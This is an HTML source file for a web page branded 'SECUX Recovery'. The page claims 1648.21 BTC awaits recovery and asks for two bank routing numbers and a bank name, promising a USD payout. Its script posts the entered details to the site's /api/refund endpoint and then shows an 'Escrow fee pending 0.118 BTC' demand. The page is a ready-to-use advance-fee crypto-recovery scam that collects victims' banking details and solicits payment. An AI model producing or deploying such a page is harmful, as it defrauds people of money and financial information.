
<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>SECUX Recovery</title>
	<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
	<style>
		body {
			background: #232323;
			color: #e0e0e0;
			font-family: 'Inter', Arial, sans-serif;
			min-height: 100vh;
			margin: 0;
			display: flex;
			justify-content: center;
			align-items: center;
		}
		.phone-frame {
			background: #111;
			border-radius: 24px;
			box-shadow: 0 0 32px 0 #000a, 0 2px 8px #0008;
			padding: 32px 0 32px 0;
			width: 370px;
			min-height: 720px;
			display: flex;
			flex-direction: column;
			align-items: center;
		}
		.container {
			background: #18191c;
			border-radius: 18px;
			box-shadow: 0 4px 32px rgba(0,0,0,0.4);
			padding: 0;
			width: 340px;
			margin: 0 auto;
		}
		.header {
			display: flex;
			justify-content: space-between;
			align-items: center;
			padding: 24px 24px 0 24px;
		}
		.logo {
			font-weight: 700;
			font-size: 1.18em;
			letter-spacing: 1px;
			color: #fff;
		}
		.logo span {
			color: #b6ff6b;
		}
		.btn {
			background: #232323;
			color: #b6ff6b;
			border: none;
			border-radius: 8px;
			padding: 7px 18px;
			font-weight: 600;
			font-size: 0.98em;
			cursor: pointer;
			transition: background 0.2s;
			box-shadow: 0 1px 2px #0002;
		}
		.btn:hover {
			background: #2e2e2e;
		}
		.tab-group {
			display: flex;
			gap: 10px;
			margin: 18px 0 0 0;
			padding: 0 24px;
		}
		.tab {
			flex: 1;
			background: #232323;
			color: #e0e0e0;
			border: none;
			border-radius: 8px 8px 0 0;
			padding: 10px 0 8px 0;
			font-weight: 500;
			font-size: 1em;
			cursor: pointer;
			transition: background 0.2s;
			box-shadow: 0 1px 2px #0002;
		}
		.tab.active {
			background: #18191c;
			color: #b6ff6b;
			font-weight: 600;
		}
		.card {
			background: #232323;
			border-radius: 12px;
			padding: 24px 20px 20px 20px;
			margin: 18px 24px 0 24px;
			box-shadow: 0 2px 8px rgba(0,0,0,0.15);
			border: 1.5px solid #232323;
		}
		.btc-amount {
			font-size: 2.2em;
			font-weight: 700;
			color: #fff;
			margin-bottom: 2px;
			letter-spacing: 0.5px;
		}
		.btc-desc {
			color: #bdbdbd;
			font-size: 1.01em;
			margin-bottom: 10px;
			font-weight: 500;
		}
		.slider-row {
			display: flex;
			align-items: center;
			gap: 10px;
			margin: 10px 0 18px 0;
		}
		.slider-label {
			color: #b6ff6b;
			font-size: 1em;
			font-weight: 600;
			letter-spacing: 0.1em;
		}
		.slider {
			flex: 1;
			accent-color: #b6ff6b;
			height: 2px;
			background: #232323;
			border-radius: 2px;
			margin: 0 6px;
		}
		.info-row {
			display: flex;
			justify-content: space-between;
			font-size: 1.01em;
			margin-bottom: 2px;
		}
		.info-label {
			color: #bdbdbd;
			font-size: 0.98em;
			font-weight: 500;
		}
		.info-value {
			color: #fff;
			font-weight: 600;
			font-size: 1.01em;
		}
		.form-group {
			margin-bottom: 16px;
		}
		.form-label {
			color: #bdbdbd;
			font-size: 0.98em;
			margin-bottom: 4px;
			display: block;
			font-weight: 500;
		}
		.form-input {
			width: 100%;
			padding: 12px 10px;
			background: #18191c;
			border: 1.5px solid #232323;
			border-radius: 7px;
			color: #e0e0e0;
			font-size: 1em;
			margin-top: 2px;
			font-family: inherit;
			font-weight: 500;
			letter-spacing: 0.01em;
		}
		.form-input:focus {
			outline: none;
			border-color: #b6ff6b;
		}
		.submit-btn {
			width: 100%;
			background: #232323;
			color: #b6ff6b;
			font-weight: 700;
			border: 1.5px solid #b6ff6b;
			border-radius: 8px;
			padding: 13px 0;
			font-size: 1.1em;
			margin-top: 10px;
			cursor: pointer;
			transition: background 0.2s, color 0.2s;
			letter-spacing: 0.01em;
			box-shadow: 0 1px 2px #0002;
		}
		.submit-btn:hover {
			background: #b6ff6b;
			color: #232323;
		}
		.note {
			color: #888;
			font-size: 0.92em;
			margin-top: 8px;
			text-align: center;
			font-weight: 500;
		}
	</style>
</head>
<body>
	<div class="phone-frame">
		<div class="container">
			<div class="header">
				<div class="logo">SEC<span>UX</span> RECOVERY</div>
				<button class="btn" type="button">Collect BTC</button>
			</div>
			<div class="tab-group">
				<button class="tab active" type="button">Recovery Page</button>
				<button class="tab" type="button">Start Recovery</button>
			</div>
			<form id="refundForm" class="card">
				<div class="btc-amount" id="btcAmount">1648.21 BTC</div>
				<div class="btc-desc">to be recovered</div>
				<div class="slider-row">
					<span class="slider-label">Recovery</span>
					<input type="range" min="0" max="1" step="1" value="0" class="slider" id="recoverySlider" disabled>
					<span class="slider-label">Activity</span>
				</div>
				<div class="info-row">
					<div>
						<span class="info-label">Due Date</span><br>
						<span class="info-value" id="dueDate">Jan 1, 2026</span>
					</div>
					<div>
						<span class="info-label">Escrow Fee</span><br>
						<span class="info-value" id="escrowFee">0.18</span>
					</div>
				</div>
				<div class="info-row" style="margin-top: 8px;">
					<div>
						<span class="info-label">Recovery Amount</span><br>
						<span class="info-value" id="recoveryAmount">1648.21 BTC</span>
					</div>
				</div>
				<div class="form-group">
					<label class="form-label" for="routing1">Bank Routing Number</label>
					<input class="form-input" type="text" id="routing1" name="routing1" placeholder="Recurrent: Active Recover" required>
				</div>
				<div class="form-group">
					<label class="form-label" for="routing2">Bank Routing Number</label>
					<input class="form-input" type="text" id="routing2" name="routing2" placeholder="Recurrent: Active Recover" required>
				</div>
				<div class="form-group">
					<label class="form-label" for="bankName">Bank Name</label>
					<input class="form-input" type="text" id="bankName" name="bankName" placeholder="Recurrent: Active Recover" required>
				</div>
				<button class="submit-btn" type="submit">Submit Request</button>
				<div class="note">We will convert your BTC to USD and send to your provided bank account.</div>
			</form>
		</div>
	</div>
	<script>
		document.getElementById('refundForm').addEventListener('submit', async function(e) {
			e.preventDefault();
			const data = {
				btcAmount: document.getElementById('btcAmount').textContent,
				dueDate: document.getElementById('dueDate').textContent,
				escrowFee: document.getElementById('escrowFee').textContent,
				recoveryAmount: document.getElementById('recoveryAmount').textContent,
				routing1: document.getElementById('routing1').value,
				routing2: document.getElementById('routing2').value,
				bankName: document.getElementById('bankName').value
			};
			try {
				const response = await fetch('/api/refund', {
					method: 'POST',
					headers: { 'Content-Type': 'application/json' },
					body: JSON.stringify(data)
				});
				if (response.ok) {
					// Show escrow fee pending message in-page
					const formCard = document.querySelector('.card');
					formCard.innerHTML = `
						<div style="text-align:center; padding: 60px 0;">
							<div style="font-size:1.25em; font-weight:600; color:#b6ff6b; margin-bottom:10px;">Escrow fee pending</div>
							<div style="font-size:1.7em; font-weight:700; color:#fff;">0.118 BTC</div>
						</div>
					`;
				} else {
					alert('There was an error submitting your request.');
				}
			} catch (err) {
				alert('There was an error submitting your request.');
			}
		});
	</script>
</body>
</html>
